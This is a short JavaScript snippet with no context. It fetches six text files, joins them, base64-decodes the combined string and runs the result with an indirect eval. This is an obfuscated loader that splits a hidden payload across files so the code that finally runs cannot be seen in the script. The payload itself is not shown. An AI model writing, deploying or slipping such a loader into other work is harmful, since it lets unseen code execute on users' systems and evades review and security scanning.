(async function(){
  const parts=await Promise.all([
    fetch('g1.txt').then(r=>r.text()),
    fetch('g2.txt').then(r=>r.text()),
    fetch('g3.txt').then(r=>r.text()),
    fetch('g4.txt').then(r=>r.text()),
    fetch('g5.txt').then(r=>r.text()),
    fetch('g6.txt').then(r=>r.text())
  ]);
  const bin=Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0));
  (0,eval)(new TextDecoder().decode(bin));
})();
